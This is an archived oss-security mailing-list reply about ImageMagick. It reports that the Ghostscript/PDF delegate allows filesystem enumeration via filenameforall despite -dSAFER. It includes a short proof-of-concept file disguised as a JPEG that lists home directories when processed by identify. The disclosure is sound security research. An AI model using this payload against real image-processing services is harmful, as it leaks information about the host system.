X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1431" "Wednesday" "28" "September" "2016" "11:16:10" "-0700" "Tavis Ormandy" "taviso@google.com" "<CAJ_zFkLCxTbJsZM7H53Kpd_OtBCPaiFowvoHJ0K-h6=e7u_Xog@mail.gmail.com>" "42" "Re: [oss-security] ImageMagick identify \"d:\" hangs" "^Date:" nil nil "9" "2016092818:16:10" "[oss-security] ImageMagick identify \"d:\" hangs" (number mark "        taviso@googl Sep 28   42/1431  " thread-indent "\"Re: [oss-security] ImageMagick identify \"d:\" hangs\"\n") "<alpine.GSO.2.20.1609270954220.18003@freddy.simplesystems.org>" ("<alpine.GSO.2.20.1609270837170.5577@freddy.simplesystems.org>" "<20160927142500.3x26pcrhw5x4nt6s@jwilk.net>" "<alpine.GSO.2.20.1609270954220.18003@freddy.simplesystems.org>") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 32507 invoked by uid 550); 28 Sep 2016 18:25:11 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 28157 invoked from network); 28 Sep 2016 18:16:44 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=google.com; s=20120113;
        h=mime-version:in-reply-to:references:from:date:message-id:subject:to;
        bh=yyxXO5Cza1DxbLatE7ay3N0OgQMnRn7gKk+/MAO89HE=;
        b=BZI6vI32t08fe277A8lNK8jY6T9z/MrHjh90ICzaKZAIT5IOojLdB41TC7qHsncvgY
         jicLkgpBoFAvesCXdzXWHoshwYB2as9CBdJFokm8H2d15KbneUMBULvgyVe2+uoat08Z
         6AiXuLcNhv0JtETSDSJWun0B2GgPA17BNgVjCSOBX2bDp47Ml1cFX9K/bcEYlQFIvx5V
         jmQj2fSHXItqGQbo8RZfIyzdNnANDKUNwCY02wQceQu3li8VGvH/Io2Ia+XIunbEf9Pu
         HKRIOhCWmK9e93adzXZds6qqxAyKg2oFPDazNMkDlFxVUHKGrl2dBlXkUzaZIBI62cwM
         df9A==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20130820;
        h=x-gm-message-state:mime-version:in-reply-to:references:from:date
         :message-id:subject:to;
        bh=yyxXO5Cza1DxbLatE7ay3N0OgQMnRn7gKk+/MAO89HE=;
        b=FOxAASui2o7vRI6EIy++vxB1OPv0/qSvnCw4qx4dd9ND5009CwNu6Wa1kZqsoeTOUd
         nwMh62pglT1AC61jmtudnijDixfyMdFZdPx6vbbLcaTRKcPgeF16j2Y91gVqix0Tjym2
         RAemRmZUKDpFrBxO+/OeNvLBThMOzhSKVzVXgWFZOugysFu2vB4sMk+1l4itXTqklCVt
         XmoXK61pJUt0MIr+llyHiN0148nQp2goP4j6DtXZw5K/DomFEZipAEwdeqbjOUfcbry1
         WkSEj/qeOzyRVYDiNipQqbzAnuqW7AL9B0vtHKRtoys9dvU2e7guH55X7bTsxut29ejP
         SMEA==
X-Gm-Message-State: AA6/9RmyB2LVRgS17yO9tXIfLCymIbs+jQB3l4FMZE7ndzcuNQYHJjZjywFK8vQgXU8Xl6TDcnGyfUfS9dI6zEQ6
X-Received: by 10.31.16.12 with SMTP id g12mr15272361vki.146.1475086591539;
 Wed, 28 Sep 2016 11:16:31 -0700 (PDT)
MIME-Version: 1.0
In-Reply-To: <alpine.GSO.2.20.1609270954220.18003@freddy.simplesystems.org>
References: <alpine.GSO.2.20.1609270837170.5577@freddy.simplesystems.org>
 <20160927142500.3x26pcrhw5x4nt6s@jwilk.net> <alpine.GSO.2.20.1609270954220.18003@freddy.simplesystems.org>
Message-ID: <CAJ_zFkLCxTbJsZM7H53Kpd_OtBCPaiFowvoHJ0K-h6=e7u_Xog@mail.gmail.com>
Content-Type: text/plain; charset=UTF-8
Date: Wed, 28 Sep 2016 11:16:10 -0700
From: Tavis Ormandy <taviso@google.com>
Reply-To: oss-security@lists.openwall.com
Subject: Re: [oss-security] ImageMagick identify "d:" hangs
To: oss-security@lists.openwall.com

On Tue, Sep 27, 2016 at 7:56 AM, Bob Friesenhahn
<bfriesen@simple.dallas.tx.us> wrote:
>
> On Tue, 27 Sep 2016, Jakub Wilk wrote:
>
>> * Bob Friesenhahn <bfriesen@simple.dallas.tx.us>, 2016-09-27, 08:48:
>>>
>>> From my own investigations, I used
>>>
>>>  identify -debug all "d:"
>>>
>>> and see that a temporary file is reported to be created and then the program hangs which no apparent CPU usage.
>>
>>
>> strace tells me that it waits for input on stdin.
>> This is a simpler way to make it "hang":
>>
>>  identify -
>
>
> This is what I expected was happening.  The main thing to investigate is if the "ImageTragick" patches distributions are using do protect against this possible issue as well.
>

You know, you reminded me that the pdf and/or the ps delegate probably
allows filesystem enumeration via filenameforall, as far as I know
that's permitted with -dSAFER. I think that's probably unexpected.

For example, if you try to identify a file like this, it will list
local usernames on stdout, I guess a real attack would have to encode
that in the output somehow, but I only know enough postscript to know
i'd rather write bf. Might be a fun exercise for masochistic hackers
though.

$ cat whatever.jpeg
%PDF-1.0
(/home/*) {==} 256 string filenameforall
$ identify whatever.jpeg
(/home/taviso)
identify.im6: Postscript delegate failed `whatever.jpeg': No such file
or directory @ error/pdf.c/ReadPDFImage/677.

Tavis.
